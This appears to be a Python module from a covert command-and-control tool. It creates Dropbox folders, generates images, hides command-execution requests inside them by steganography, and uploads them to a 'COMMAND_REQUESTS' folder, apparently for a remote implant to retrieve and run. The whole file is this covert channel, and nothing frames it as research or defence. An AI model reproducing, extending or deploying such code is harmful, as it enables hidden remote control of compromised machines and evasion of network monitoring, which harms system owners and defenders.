from typing import Set
from common.dropbox_wrapper import init_dropbox, list_files, DropboxFolders, create_folder, upload_file
from common.dataclasses.commands import CommandExecutionRequest
from common.image_generators.image_generator import generate_image
from common.steganography import insert_command_request_into_image
from common.utils.string_utils import generate_unique_image_name

__IMAGE_HORIZONTAL_DIMENSION = 640
__IMAGE_VERTICAL_DIMENSION = 480


def init_dropbox_handler() -> None:
    init_dropbox()
    missing_folders = __get_missing_essential_folders_from_dropbox()
    __create_missing_folders(missing_folders)


def __get_missing_essential_folders_from_dropbox() -> Set[DropboxFolders]:
    files = list_files("")
    required_folders = set([folder.value for folder in DropboxFolders])
    for file in files:
        if file.name in required_folders:
            required_folders.remove(file.name)
    return required_folders


def __create_missing_folders(folders: Set[DropboxFolders]) -> None:
    for folder in folders:
        create_folder(folder)


def upload_command_to_dropbox(command: CommandExecutionRequest) -> None:
    generated_image = generate_image(__IMAGE_HORIZONTAL_DIMENSION, __IMAGE_VERTICAL_DIMENSION)
    image_with_secret = insert_command_request_into_image(generated_image, command)
    upload_file(DropboxFolders.COMMAND_REQUESTS, generate_unique_image_name(), image_with_secret)
